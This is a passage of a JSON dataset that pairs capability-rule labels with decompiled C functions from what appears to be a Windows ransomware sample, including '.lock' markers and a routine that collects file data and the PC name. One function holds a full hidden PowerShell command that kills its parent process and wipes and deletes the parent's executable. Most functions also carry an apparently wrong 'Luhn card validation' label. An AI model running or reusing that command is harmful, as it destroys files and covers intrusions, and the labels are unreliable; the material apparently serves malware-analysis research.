            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400042d0(int64_t arg1)\n\n{\n    uchar uVar1;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    iStack20 = 0;\n    iStack16 = fcn.140002604(arg1);\n    for (; iStack16 = iStack16 + -1,  iStack20 < iStack16; iStack20 = iStack20 + 1) {\n        uVar1 = *(arg1 + iStack20);\n        *(arg1 + iStack20) = *(arg1 + iStack16);\n        *(arg1 + iStack16) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "14000465": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140004650(int64_t arg1)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uint64_t uStack32;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg1);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2, 8, iVar1 + 1);\n    for (uStack32 = 0; uStack32 < iVar1 + 1; uStack32 = uStack32 + 1) {\n        *(iVar3 + uStack32) = *(arg1 + uStack32 * 2);\n    }\n    return iVar3;\n}\n",
        "token_count": 172
    },
    "1400046e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.1400046e4(void)\n\n{\n    *0x14000aa98 = fcn.140001368(2);\n    *0x14000aaa0 = fcn.140001368(3);\n    *0x14000aac0 = fcn.140001220();\n    *0x14000aaa8 = fcn.1400049a4();\n    *0x14000aac8 = fcn.140005fc4();\n    *0x14000aad0 = fcn.1400041ec();\n    return 1;\n}\n",
        "token_count": 123
    },
    "14000474": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.140004744(uchar *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    uchar *puVar2;\n    uchar *puVar3;\n    uchar auStack48 [8];\n    uint uStack40;\n    ulong uStack32;\n    \n    fcn.140006604(0x4038, 0x3000, 0x40);\n    uStack32 = fcn.140006604(*(arg2 + 8) + 0x100, 0x3000, 0x40);\n    uStack40 = fcn.140004894(*(arg2 + 0x10), *(arg2 + 8), uStack32, *(arg2 + 8) + 0x100);\n    puVar2 = auStack48;\n    puVar3 = arg1;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    return arg1;\n}\n",
        "token_count": 254
    },
    "14000480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140004800(ulong arg1, ulong arg2)\n\n{\n    fcn.140005fa0(arg1, arg2);\n    return;\n}\n",
        "token_count": 36
    },
    "14000483": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140004830(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    uint32_t uStack40;\n    \n    for (uStack40 = 0; uStack40 < arg3; uStack40 = uStack40 + 1) {\n        *(arg1 + uStack40) = *(arg2 + uStack40);\n    }\n    return arg1;\n}\n",
        "token_count": 91
    },
    "140004a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.140004a08(uint64_t arg1, uint64_t arg2)\n\n{\n    if (arg2 > arg1) {\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0xd);\n    }\n    return arg2 <= arg1;\n}\n",
        "token_count": 58
    },
    "140004fe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140004fe4(void)\n\n{\n    int64_t iVar1;\n    char **ppcVar2;\n    uchar *puVar3;\n    char *pcStack216;\n    ulong uStack208;\n    ulong uStack200;\n    ulong uStack192;\n    char *pcStack160;\n    ulong uStack152;\n    uchar auStack136 [32];\n    uchar auStack104 [88];\n    \n    pcStack160 = \"locked\";\n    uStack152 = 7;\n    uStack208 = 1;\n    uStack192 = 7;\n    uStack200 = 1;\n    pcStack216 = \".lock\";\n    ppcVar2 = &pcStack216;\n    puVar3 = auStack104;\n    for (iVar1 = 0x48; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *ppcVar2;\n        ppcVar2 = ppcVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    fcn.140005d40(auStack136, auStack104, 0);\n    return;\n}\n",
        "token_count": 248
    },
    "140005d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * fcn.140005d40(uint *arg1, ulong *arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    ulong uVar3;\n    uint *puVar4;\n    ulong uStack72;\n    int64_t iStack64;\n    ulong uStack56;\n    ulong uStack48;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar auStack24 [24];\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2, 8, 0x100);\n    uVar3 = fcn.140006604(0x9f17, 0x3000, 0x40);\n    uStack72 = fcn.140006604(0x7f18, 0x3000, 0x40);\n    iStack64 = arg3 * 0x7f17 + arg2[7];\n    uVar1 = fcn.140002b6c(iStack64);\n    fcn.140004830(uStack72, iStack64, uVar1);\n    fcn.140003140(uVar3, 0x1400082dc, 0x14000a0d0);\n    fcn.140003140(uVar3, \"data\", uStack72);\n    fcn.140003388(arg2[3], uVar2, 10);\n    fcn.140003140(uVar3, \"filesize\", uVar2);\n    fcn.140003388(0x7f17, uVar2, 10);\n    fcn.140003140(uVar3, \"framesize\", uVar2);\n    fcn.140003388(arg3, uVar2, 10);\n    fcn.140003140(uVar3, \"framenum\", uVar2);\n    fcn.140003388(arg2[1], uVar2, 10);\n    fcn.140003140(uVar3, \"filecrc\", uVar2);\n    fcn.140003140(uVar3, \"filename\", *arg2);\n    fcn.140003140(uVar3, \"pcname\", *0x14000aaa0);\n    uStack56 = 0;\n    uStack48 = 0;\n    uVar1 = fcn.140002604(uVar3);\n    puVar4 = fcn.140006cb8(auStack24, *0x14000a9d8, uVar3, uVar1);\n    uStack40 = *puVar4;\n    uStack36 = puVar4[1];\n    uStack32 = puVar4[2];\n    uStack28 = puVar4[3];\n    uStack56._0_4_ = uStack40;\n    uStack56._4_4_ = uStack36;\n    uStack48._0_4_ = uStack32;\n    uStack48._4_4_ = uStack28;\n    fcn.140002470(uVar2, 0, 0x100);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3, 0, uVar2);\n    fcn.14000428c(&uStack72, 0x2001);\n    *arg1 = uStack56;\n    arg1[1] = uStack56._4_4_;\n    arg1[2] = uStack48;\n    arg1[3] = uStack48._4_4_;\n    return arg1;\n}\n",
        "token_count": 820
    },
    "14000650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delay execution",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.140006504(void)\n\n{\n    ulong auStack144 [3];\n    uint auStack120 [30];\n    \n    fcn.140002470(auStack120, 0, 0x68);\n    fcn.140002470(auStack144, 0, 0x18);\n    auStack120[0] = 0x68;\n    (*_sym.imp.KERNEL32.dll_CreateProcessA)\n              (0, \n               \"powershell.exe -nop -w hidden -C \\\"$ppid = (gwmi win32_process | ? processid -eq  $PID).parentprocessid; $proc = Get-Process -FileVersionInfo -Id $ppid; Stop-Process -Force -ErrorAction SilentlyContinue -Id $ppid; $buff = [byte[]]@(, 0 * 1mb); Set-Content -Path $proc.FileName -Force -Confirm:0 -Value $buff; Remove-Item -Path $proc.FileName -Force -Confirm:0 \\\"\"\n               , 0, 0, 0, 0, 0, 0, auStack120, auStack144);\n    (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(auStack144[0], 0xffffffff);\n    return;\n}\n",
        "token_count": 275
    },
    "1400065a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.1400065a4(void)\n\n{\n    fcn.1400014fc();\n    fcn.1400034d4();\n    fcn.140004da0();\n    fcn.140005394();\n    fcn.140006b4c();\n    return 0;\n}\n",
        "token_count": 65
    },
    "1400065c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.1400065c8(ulong arg1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetFileSize)(arg1, 0);\n    if ((8000000 < uVar1) && (uVar1 < 10000)) {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 88
    },
    "14000660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.140006604(uint64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uStackX8;\n    uint uStackX16;\n    uint uStackX24;\n    ulong auStack24 [3];\n    \n    auStack24[0] = 0;\n    uStackX8 = arg1;\n    uStackX16 = arg2;\n    uStackX24 = arg3;\n    iVar1 = (**0x14000a9f8)(0xffffffffffffffff, auStack24, 0, &uStackX8, arg2, arg3);\n    if (iVar1 < 0) {\n        auStack24[0] = 0;\n    }\n    else {\n        fcn.140002470(auStack24[0], 0, uStackX8 & 0xffffffff);\n    }\n    return auStack24[0];\n}\n",
        "token_count": 200
    },
    "140006d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.140006d70(ulong arg1, ulong arg2)\n\n{\n    uint32_t uStack24;\n    int32_t iStack20;\n    \n    iStack20 = 0;\n    for (uStack24 = 0; uStack24 < arg1; uStack24 = uStack24 + 1) {\n        if (uStack24 % 3 == 0) {\n            iStack20 = iStack20 + 1;\n        }\n    }\n    return iStack20 << 2;\n}\n",
        "token_count": 115
    },
    "14000100": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.140001000(char *arg1, ulong arg2)\n\n{\n    char *pcStackX8;\n    \n    // [00] -r-x section size 28672 named .text\n    pcStackX8 = arg1;\n    while( true ) {\n        if (*pcStackX8 == '\\0') {\n            return NULL;\n        }\n        if (*pcStackX8 == arg2) break;\n        pcStackX8 = pcStackX8 + 1;\n    }\n    return pcStackX8;\n}\n",
        "token_count": 115
    }
}